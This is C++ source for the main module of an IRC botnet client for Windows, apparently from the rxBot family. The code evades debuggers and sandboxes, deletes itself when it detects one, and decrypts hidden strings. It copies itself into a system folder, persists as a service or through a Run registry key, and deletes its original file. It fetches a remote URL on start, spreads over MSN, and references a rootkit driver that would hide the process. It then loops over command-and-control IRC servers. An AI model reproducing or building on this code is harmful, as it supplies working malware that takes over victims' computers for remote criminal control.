#include "includes.h"
#include "functions.h"
#include "configs.h"
//#include "globals.h"
//#include "strings.h"

#ifndef _DEBUG
#pragma comment(linker, "/subsystem:windows ")
#else
#pragma comment(linker, "/subsystem:console ")
#endif // _DEBUG

bool rkenabled;//did fu's driver get loaded?

DWORD dwstarted;
DWORD dwconnected;

IRC mainirc;
HANDLE mutex;
int curserver;
int eftpsends;
int serversize=(sizeof(servers)/sizeof(SERVER));
int authsize=(sizeof(authost)/sizeof(LPTSTR));
#ifndef NO_VERSION_REPLY
int curversion;
int versionsize=(sizeof(versionlist)/sizeof(LPTSTR));
#else
int versionsize=0;
#endif

char *ip1parse="";
char *ip2parse="";
char exip[MAX_IP];
char inip[MAX_IP];
char host[MAX_HOSTNAME];

extern char str_main_thread[];
extern char str_rup_thread[];
extern char str_asecure_thread[];
extern char str_msn_thread[];

#ifndef _DEBUG
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
#else
int main(int argc, char *argv[])
#endif
{
	LoadDLLs();

#ifndef NO_DDETECT
	if(IsBugged())
	{
		EraseMe(TRUE);
		ExitProcess(1);
	}
#endif

#ifndef NO_CRYPT
	decryptstrings(authsize, versionsize, serversize);
#endif

#ifndef NO_SERVICE
	SERVICE_TABLE_ENTRY servicetable[] =
	{
		{servicename, (LPSERVICE_MAIN_FUNCTION) ServiceMain},
		{NULL, NULL}
	};
#endif

	//TODO: Error handler here

#ifndef _DEBUG
	fSetErrorMode(SEM_NOGPFAULTERRORBOX);
#endif

	char cfilename[MAX_PATH];
	char movetopath[MAX_PATH];
	char svcpath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	ExpandEnvironmentStrings(movepath,movetopath,sizeof(movetopath));
	sprintf(svcpath,"%s\\%s",movetopath,filename);
	
#ifndef _DEBUG
	if (MoveBot(movetopath,filename))
	{
#ifndef NO_MELT
		RegWrite(meltkey.hkey,meltkey.subkey,meltkey.name,cfilename);
#endif // NO_MELT


#ifndef NO_SERVICE
		InstallService(svcpath);
#else
		RegWrite(runkey.hkey,runkey.subkey,runkey.name,svcpath);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
#ifdef _DEBUG
		sinfo.wShowWindow = SW_SHOW;
#else
		sinfo.wShowWindow = SW_HIDE;
#endif // _DEBUG
		if (CreateProcess(svcpath,NULL,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL,movetopath,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}
#endif // NO_SERVICE
		ExitProcess(1);
	}
#endif // _DEBUG
#ifndef NO_SERVICE
	if(fStartServiceCtrlDispatcher(servicetable) == 0)
		InstallService(svcpath);
#else
	DWORD id;
	HANDLE threadhandle;
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BotThread, NULL, 0, &id)) == 0)
		return 0;
	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);
#endif // NO_SERVICE
#ifdef _DEBUG
//	CloseLog();
#endif
	return 0;
}

DWORD WINAPI BotThread(LPVOID param)
{
	for (int m=0;m<6;m++)
	{
		if(!(mutex=CreateMutex(NULL, FALSE, mutexhandle)))
			Sleep(5000);
		else
			break;
	}
//	if (WaitForSingleObject(CreateMutex(NULL, TRUE, mutexhandle), 30000) == WAIT_TIMEOUT)
//		ExitProcess(0);

	addthread(MAIN_THREAD,str_main_thread,main_title);

#ifndef _DEBUG
#ifndef NO_MELT
		char *melt=RegQuery(meltkey.hkey,meltkey.subkey,meltkey.name);
		if (melt)
		{
			SetFileAttributes(melt,FILE_ATTRIBUTE_NORMAL);
			int tries=0;
			while (FileExists(melt) && tries<3)
			{
				DeleteFile(melt);
				tries++;
				Sleep(2000);
			}
			RegDelete(meltkey.hkey,meltkey.subkey,meltkey.name);
		}
#endif // NO_MELT
#endif // _DEBUG

	srand(GetTickCount());
	dwstarted=GetTickCount();
#ifndef NO_VERSION_REPLY
	curversion=rand()%(versionsize);
#ifdef _DEBUG
	printf("Generated current_version: %d (%d), %s.\n",curversion,versionsize,versionlist[curversion]);
#endif
#endif

	WSADATA wsadata;
	if (fWSAStartup(MAKEWORD(2,2),&wsadata)!=0)
		ExitProcess(-2);

#ifndef _DEBUG
#ifndef NO_FCONNECT
	char readbuf[1024];
	HINTERNET httpopen, openurl;
	DWORD read;
	httpopen=fInternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
	openurl=fInternetOpenUrl(httpopen,cononstart,NULL,NULL,INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE,NULL);
	if (!openurl)
	{
		fInternetCloseHandle(httpopen);
		fInternetCloseHandle(openurl);
	}
	fInternetReadFile(openurl,readbuf,sizeof(readbuf),&read);
	fInternetCloseHandle(httpopen);
	fInternetCloseHandle(openurl);
#endif // NO_FCONNECT
#endif // _DEBUG

#ifndef NO_INSTALLED_TIME
	if (!noadvapi32)
		GetInstalledTime();
	else
		sprintf(installedt,"Error");
#endif // NO_INSTALLED_TIME
	
	int i=0;
	DWORD id=0;

#ifndef NO_RECORD_UPTIME
	i=addthread(RUPTIME_THREAD,str_rup_thread,main_title);
	threads[i].tHandle=CreateThread(NULL,0,&RecordUptimeThread,0,0,&id);
#endif // NO_RECORD_UPTIME

#ifndef NO_MSNSPREAD
         MSNSPREAD MSN;
 		NTHREAD msn;
 	    msn.threadnum = addthread(MSNSPREAD_THREAD,str_msn_thread,msnspread_title);
 		threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &initfile, (LPVOID)&MSN, 0, &id);
 #endif // NO_MSNSPREAD
#ifndef NO_AUTO_SECURE
#ifndef NO_SECURE
	NTHREAD secure;		
	secure.bdata2=TRUE;//loop
	i=addthread(SECURE_THREAD,str_asecure_thread,sec_title);
	threads[i].tHandle=CreateThread(NULL,0,&SecureThread,(LPVOID)&secure,0,&id);
#endif
#endif // NO_AUTO_SECURE
/*	
#ifndef NO_RDRIV
#ifndef _DEBUG
	rkenabled=InitRK();//initialize fu
	if (rkenabled)
		HideMe();//hide the process
#endif // _DEBUG
#endif // NO_RDRIV
*/
#ifndef _DEBUG // maybe this will give the shutdown handler time to work
	RegWrite(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control","WaitToKillServiceTimeout","7000");
#endif
	
	//get internal ip
	char *ip;
	char hostname[256];
	struct hostent *h;
	fgethostname(hostname, 256);
	h = fgethostbyname(hostname);
	ip = finet_ntoa(*(struct in_addr *)h->h_addr_list[0]);
	strncpy(inip,ip,sizeof(inip));


	curserver=0;
	HookProtocol(&mainirc);
	
	while (mainirc.should_connect()) {
		if (!mainirc.is_connected())
		{
#ifdef _DEBUG
			printf("Trying to connect to: %s:%i\r\n",servers[curserver].host,servers[curserver].port);
#endif

#ifndef NO_FLUSHDNS
			FlushDNSCache();
#endif
			mainirc.start(servers[curserver].host,servers[curserver].port,
					  mainirc.nickgen(NICK_TYPE,REQ_NICKLEN),mainirc.nickgen(IDENT_TYPE,REQ_IDENTLEN),
					  mainirc.nickgen(REALN_TYPE,REQ_REALNLEN),servers[curserver].pass);
			mainirc.message_loop();
		}
		else{
			mainirc.message_loop();
		}

		Sleep(SFLOOD_DELAY);
		
		if (curserver==(serversize-1))
			curserver=0;
		else
			curserver++;
	}

	// cleanup;
	killthreadall();
	fWSACleanup();
	ReleaseMutex(mutex);
	ExitThread(0);
}